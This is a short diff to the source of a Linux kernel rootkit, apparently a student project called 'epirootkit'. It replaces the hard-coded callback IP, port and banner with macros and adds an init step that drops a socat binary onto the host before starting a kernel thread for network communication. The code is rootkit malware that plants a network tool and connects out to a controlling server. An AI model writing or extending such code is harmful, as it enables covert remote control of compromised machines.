@@ -8,9 +8,9 @@
 struct task_struct *network_thread = NULL;
 bool thread_exited = false;
 
-char *ip = "127.0.0.1";
-int port = 4242;
-char *message = "epirootkit: connexion established\n";
+char *ip = SERVER_IP;
+int port = SERVER_PORT;
+char *message = CONNEXION_MESSAGE;
 
 module_param(ip, charp, 0644);
 module_param(port, int, 0644);
@@ -37,6 +37,11 @@ static int __init epirootkit_init(void)
 	if(init_exec_result() != SUCCESS) {
 		pr_err("epirootkit: epirootkit_init: memory allocation failed\n");
 		return -ENOMEM;
+	}
+
+	if(drop_socat_binaire() != SUCCESS) {
+		pr_err("epirootkit: epirootkit_init: failed to drop socat binary\n");
+		return FAILURE;
 	}
 
 	// Start a kernel thread that will handle network communication
